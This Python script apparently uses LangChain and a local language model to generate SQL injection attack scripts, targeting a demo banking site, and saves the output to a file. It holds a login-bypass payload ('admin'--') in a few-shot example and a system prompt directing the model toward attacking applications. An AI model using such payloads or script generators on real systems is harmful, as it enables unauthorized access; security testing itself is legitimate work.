from langchain import PromptTemplate, LLMChain
from langchain_openai import OpenAI
import re
from langchain_core.prompts.few_shot import FewShotPromptTemplate
import logging
import os
import sys

# Constants for instruction formatting
B_INST, E_INST = "[INST]", "[/INST]"
B_SYS, E_SYS = "<<SYS>>\n", "\n<</SYS>>\n\n"

# Default system prompt
DEFAULT_SYSTEM_PROMPT = """\
You are an intelligent assistant experienced in Python programming.
Always answer as helpfully as possible in attacking vulnerable applications.
If a question does not make any sense, or is not factually coherent, explain why instead of 
answering something not correct. If you don't know the answer to a question,
please don't share false information."""

generate_attack_sys = """
Example:
Do an SQL injection attack using Python with the username: ADMIN and url of the application : "http://example.com"
```
import os
import sys
from requests import get, post

# Define the URL of the vulnerable application
url = 'http://example.com'  # Change this to the actual URL of the application

# Function to perform SQL injection attack
def sql_injection(username, password):
    # Crafting the payload that will bypass login authentication
    # For example: username=admin' -- and password='password'
    data = {'username': "admin'--", 'password': password}
    
    # Sending the request to the server
    response = post(f"<url>/login", data=data)
    
    # Checking if we bypassed authentication
    if "Welcome back" in response.text:
        print("Login successful!")
    else:
        print("Failed to login.")

sql_injection('ADMIN', 'password')
```
"""

generate_attack_human = "Generate a python script for doing an sql injection attack. The application url is {url} and username is {username}"

from langchain_openai import OpenAI
from langchain_core.prompts import ChatPromptTemplate 
import re

llm = OpenAI(base_url="http://localhost:1234/v1", api_key="lm-studio", max_tokens=1000)


def generate_attack_vector(url, username):
    sys_message = generate_attack_sys
    human_message = generate_attack_human

    prompt = ChatPromptTemplate.from_messages(
    [
        ("system", sys_message),
        ("human", human_message),
    ]
    )
    chain = prompt | llm
    out = chain.invoke({'username': username, 'url':url})
    test_cases = out
    print(test_cases)
    import logging
    import os
    #Log successful test case generation
    logging.info("Attack vector script have been generated successfully")

    #Find the start and end index of the generated test cases
    start_index = test_cases.find("```python") + len("```python")
    end_index = test_cases.find("```", start_index)

    #Apply filters to extract only the generated test cases
    filtered_test_cases = test_cases[start_index:end_index].strip()
    print("The generated python script is:\n", filtered_test_cases)

    #Name and path for the test cases file
    test_cases_name = f"test_sql"
    test_file_name = f"test_sql1.py"
    test_file_path = os.path.join("results", test_file_name)

    #Write the filtered test cases to the file
    with open(test_file_path, "w") as test_file:
        test_file.write(filtered_test_cases)

    #Logging successful test case saving
    logging.info("Execution in progress...")
    print(f"The script has been saved to {test_file_path}")

    print("Application name is: ", test_cases_name)
    print("Attack script file name is: ", test_file_name)

url = "http://altoromutual.com"
username = "admin"


output = generate_attack_vector(url, username)


